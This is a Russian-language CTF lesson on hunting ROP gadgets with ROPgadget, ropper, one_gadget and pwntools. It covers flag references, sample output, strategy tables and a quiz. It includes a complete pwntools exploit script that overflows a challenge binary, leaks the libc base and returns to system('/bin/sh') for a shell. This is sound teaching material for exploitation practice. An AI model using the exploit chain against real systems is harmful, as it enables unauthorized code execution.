---
id: pwn-gadget-hunting
title: "Поиск гаджетов: ROPgadget, ropper и one_gadget"
category: pwn
parent: pwn-rop
difficulty: easy
order: 1
tags: [rop, gadgets, ropgadget, ropper, one_gadget]
prerequisites: [pwn-rop, pwn-pwntools]
useful_for:
  - "CTF Pwn категория"
  - "Построение ROP-цепочек"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Учимся находить нужные ROP-гаджеты в бинаре и libc инструментами ROPgadget, ropper, pwntools ROP и one_gadget, а также строить цепочку автоматически."
---
Поиск гаджетов — рутинная, но критичная часть ROP. Гаджет — короткая последовательность инструкций, заканчивающаяся `ret` (для ROP), `jmp`/`call` (для JOP) или `syscall`. От того, какие гаджеты есть в бинаре и libc, зависит, какую технику эксплуатации вообще можно применить. Этот урок — практический справочник по `ROPgadget`, `ropper` и `one_gadget` с полным набором флагов.

## Что такое гаджет и почему он заканчивается ret

Инструкция `ret` снимает со стека адрес и передаёт туда управление. Если стек заполнен адресами гаджетов, каждый `ret` «съедает» следующий адрес и переходит к следующему гаджету — так строится цепочка. Гаджеты ищут в исполняемых сегментах (`r-x`): `.text`, `.plt`, libc, vDSO. Гаджет может начинаться в середине инструкции (unaligned) — именно это даёт огромное количество комбинаций, например `pop rdi; ret`, начинающийся с байта `0x5f` внутри другой инструкции.

## ROPgadget: полный набор флагов

```bash
ROPgadget --binary ./chall                       # все гаджеты
ROPgadget --binary ./chall --only 'pop|ret'      # только pop/ret
ROPgadget --binary ./chall --depth 5             # до 5 инструкций
ROPgadget --binary ./chall | grep 'pop rdi ; ret'
ROPgadget --binary ./chall --opcode 5f           # по байтам (pop rdi = 0x5f)
ROPgadget --binary ./chall --string '/bin/sh'    # строки
ROPgadget --binary ./libc.so.6 --only 'pop|ret' | grep rdx
ROPgadget --binary ./chall --multibr             # многоразрядные
ROPgadget --binary ./chall --thumb               # ARM Thumb
ROPgadget --binary ./chall --rawArch=x86 --rawMode=32
```

Типичный вывод:

```
0x0000000000401233 : pop rdi ; ret
0x0000000000401231 : pop rsi ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401234 : pop rdx ; pop r12 ; ret
```

`--only` резко ускоряет поиск, ограничивая набор инструкций. `--depth` контролирует длину. `--opcode` ищет по конкретным байтам, когда нужен нестандартный гаджет.

## ropper: альтернатива с семантическим поиском

```bash
ropper --file ./chall --search 'pop rdi; ret'
ropper --file ./chall --semantic --search 'xchg rax, rsp'
ropper --file ./chall --chain 'execve'           # автоматические цепочки
ropper --file ./libc.so.6 --search 'pop rdx; ret' --nocolor
ropper --file ./chall --type rop --inst-count 4
```

`ropper --semantic` ищет по эффекту, а не по точному тексту — полезно для экзотических гаджетов (pivot, zeroing). `ropper --chain 'execve'` умеет строить цепочку автоматически, если хватает гаджетов.

## one_gadget: одношаговый shell в libc

```bash
one_gadget ./libc.so.6
one_gadget ./libc.so.6 --level 1                 # более строгие constraints
one_gadget ./libc.so.6 -r                        # raw
one_gadget ./libc.so.6 --raw
```

Вывод:

```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
```

Каждый one_gadget требует выполнения constraints (обычно обнуления регистров). Если состояние стека/регистров в точке возврата совпадает с constraints — прыжок на этот адрес сразу даёт shell без вызова `system`. `--level 1` ослабляет требования (больше кандидатов, но менее строгие).

## Гаджеты в libc vs в бинаре

При PIE гаджеты в бинаре по смещениям, а в libc — по адресам после утечки. Часто в бинаре нет `pop rdx`, и его берут из libc. Порядок: сначала утекают базу libc, потом ищут гаджеты в libc и складывают смещения с базой.

```python
from pwn import *
libc = ELF('./libc.so.6')
rop = ROP(libc)
rop.rdx                            # адрес pop rdx; ret в libc
```

## Автоматизация поиска в pwntools

```python
from pwn import *
elf = ELF('./chall')
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret']).address
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
rop.rdi, rop.rsi, rop.rdx, rop.rax
rop.ret.address                    # ret для выравнивания
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

`ROP(elf)` использует собственный движок поиска гаджетов; `rop.dump()` печатает человекочитаемую цепочку — незаменимо для отладки.

## Стратегия при нехватке гаджетов

| Проблема | Решение |
|---|---|
| нет `pop rdi` | гаджет из libc или ret2csu |
| нет `pop rsi` | `__libc_csu_init` (ret2csu) |
| нет `pop rdx` | ret2csu или гаджет из libc |
| нет `syscall` | vDSO/vsyscall или гаджет в libc |
| нет ничего | SROP (один `syscall; ret`) |
| цепочка не влезает | stack pivot |

## Тонкости и подводные камни

- **Unaligned-гаджеты.** Некоторые гаджеты начинаются в середине инструкции; это нормально, но проверяйте дизассемблером, что байты действительно складываются в нужную последовательность.
- **`movaps` и выравнивание.** Даже идеальная цепочка упадёт без `ret` для выравнивания стека.
- **Гаджет с `pop` меняет `rsp`.** Каждый `pop` съедает слово из цепочки — учитывайте это при подсчёте.
- **Архитектурные различия.** В ARM64 нет `pop`; используются `ldp x29, x30, [sp], #16; ret`.
- **CET shadow stack.** Проверяет каждый `ret` — классические гаджеты не работают.
- **`--only` прячет нужное.** Если гаджет не находится, снимите фильтр.

## Практический пример: цепочка из гаджетов

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
OFFSET = 72

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка libc
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
    # финал
    ret = ROP(elf).find_gadget(['ret']).address
    pop_rdi = libc.address + ROP(libc).find_gadget(['pop rdi', 'ret']).address - libc.address
    # проще: пересобрать ROP(libc)
    rop2 = ROP(libc)
    rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    p.sendlineafter(b'> ', flat({OFFSET: [ret] + rop2.chain()}))
    p.interactive()

exploit()
```

## Справочные таблицы

| Инструмент | Ключевые флаги |
|---|---|
| ROPgadget | `--only`, `--depth`, `--opcode`, `--string`, `--multibr` |
| ropper | `--search`, `--semantic`, `--chain`, `--inst-count` |
| one_gadget | `--level`, `--raw` |
| pwntools | `ROP().find_gadget`, `ROP().dump` |

| Гаджет | Назначение |
|---|---|
| `pop rdi; ret` | 1-й аргумент |
| `pop rsi; pop r15; ret` | 2-й аргумент |
| `pop rdx; pop r12; ret` | 3-й аргумент |
| `syscall; ret` | системный вызов |
| `leave; ret` | stack pivot |
| `ret` | выравнивание |

## Что дальше / решение

Дальше: `pwn-rop` (сборка цепочек), `pwn-ret2csu` (когда нет pop-гаджетов), `pwn-seccomp-srop` (когда почти нет гаджетов). Практический алгоритм: (1) `checksec` и определение PIE; (2) `ROPgadget --only 'pop|ret'` для бинаря и libc; (3) фиксируем наличие `pop rdi`, `pop rsi`, `pop rdx`, `syscall`; (4) выбираем технику по таблице «нехватки гаджетов»; (5) собираем через `ROP()` и смотрим `rop.dump()`. Держите шпаргалку флагов под рукой — поиск гаджетов это 80% подготовительной работы в ROP-задаче.

## Поиск гаджетов под не-x86 архитектуры

На ARM64 нет `pop`; аргументы кладут через `ldp`/`mov`. Типичный гаджет для контроля регистров: `ldp x19, x20, [sp], #16; ret`. Для вызова функции нужен `blr xN` или `br xN`. Поиск: `ROPgadget --binary ./chall --only 'ldp|ret'`, `ropper --file ./chall --search 'ldp x29, x30, [sp], #16'`. На MIPS часто используют `move`-гаджеты и задержку слота ветвления; `ROPgadget` поддерживает `--rawArch=mips`. На RISC-V гаджеты заканчиваются `ret` (`jalr x0, ra, 0`).

## Гаджеты для ORW и SROP

Для ORW нужны `pop rax` (номер syscall), `pop rdi`/`rsi`/`rdx` (аргументы) и `syscall; ret`. Для SROP достаточно одного `syscall; ret` плюс адрес `rt_sigreturn`: подделанный фрейм восстанавливает все регистры. Поэтому при нехватке гаджетов SROP — предпочтительный путь. Проверка наличия: `ROPgadget --only 'syscall' ./chall`. Если `syscall` есть только в vDSO/vsyscall, используйте их (`pwn-ret2vdso`).

## Полный список полезных флагов

| Инструмент | Флаг | Значение |
|---|---|---|
| ROPgadget | `--only` | фильтр инструкций |
| ROPgadget | `--depth N` | макс. инструкций |
| ROPgadget | `--opcode` | поиск по байтам |
| ROPgadget | `--string` | поиск строк |
| ROPgadget | `--multibr` | многоразрядные |
| ROPgadget | `--rawArch/--rawMode` | сырые архитектуры |
| ropper | `--search` | текст гаджета |
| ropper | `--semantic` | по эффекту |
| ropper | `--chain` | авто-цепочка |
| ropper | `--inst-count` | макс. инструкций |
| one_gadget | `--level` | строгость constraints |
| one_gadget | `--raw` | без форматирования |

## Как проверить гаджет перед использованием

Найденный гаджет может начинаться в середине инструкции. Убедитесь, что байты действительно дают нужную последовательность: `objdump -d --start-address=0x... --stop-address=0x... ./chall` или в pwndbg `x/3i 0x...`. Иногда два «разных» гаджета оказываются одним и тем же адресом с разной точкой входа — это нормально для unaligned-поиска.

## Сводка

Поиск гаджетов — это инвентаризация того, что доступно. Сначала `ROPgadget --only 'pop|ret'` для бинаря и libc, затем фиксация наличия `pop rdi/rsi/rdx`, `syscall`, `ret`. По этой таблице выбирается техника: прямая цепочка, ret2csu, ret2dlresolve или SROP. Держите `rop.dump()` в эксплойте — он мгновенно показывает, правильно ли встали гаджеты, и экономит часы отладки.

## Мини-шпаргалка

| Цель | Команда |
|---|---|
| все pop/ret | `ROPgadget --binary ./x --only 'pop\|ret'` |
| гаджет в libc | `ROPgadget --binary ./libc.so.6 --only 'pop\|ret' \| grep rdx` |
| one-shot | `one_gadget ./libc.so.6 --level 1` |
| семантика | `ropper --file ./x --semantic --search 'xchg rax, rsp'` |
| в pwntools | `ROP(elf).find_gadget(['pop rdi','ret'])` |

## Квиз

```quiz
- question: "Чем обычно заканчивается ROP-гаджет?"
  options:
    - "ret"
    - "syscall"
    - "nop"
    - "int3"
  answer: 0
  explanation: "Гаджеты завершаются ret (для JOP — jmp/call)."
- question: "Какая команда ROPgadget ищет pop rdi?"
  options:
    - "ROPgadget с фильтром --only pop/ret и grep по rdi"
    - "ROPgadget --strings"
    - "ropper --nasm"
    - "one_gadget"
  answer: 0
  explanation: "Фильтр --only 'pop|ret' и grep по регистру находят нужный гаджет."
- question: "Что показывает one_gadget?"
  options:
    - "Адреса execve('/bin/sh') и их ограничения (constraints)"
    - "Все гаджеты бинаря"
    - "GOT-записи"
    - "Строки"
  answer: 0
  explanation: "one_gadget выдаёт адреса и условия их срабатывания."
- question: "Почему нельзя слепо доверять найденному гаджету?"
  options:
    - "Он может лежать в данных или иметь нежелательные инструкции"
    - "Он всегда неверен"
    - "Он меняется при ASLR"
    - "Его нет в libc"
  answer: 0
  explanation: "Гаджет нужно проверять в дизассемблере на корректность."
- question: "Что делать, если в бинаре нет pop rdx; ret?"
  options:
    - "Использовать ret2csu/__libc_csu_init или гаджеты из libc"
    - "Отказаться от эксплойта"
    - "Отключить NX"
    - "Снять canary"
  answer: 0
  explanation: "ret2csu и libc-гаджеты дают контроль над rdx при отсутствии прямого pop."
```

## Где пригодится

- **CTF:** Pwn — построение ROP.
- **Bug bounty:** разработка цепочек.
- **Пентест:** exploit development.
- **Работа:** vulnerability research.
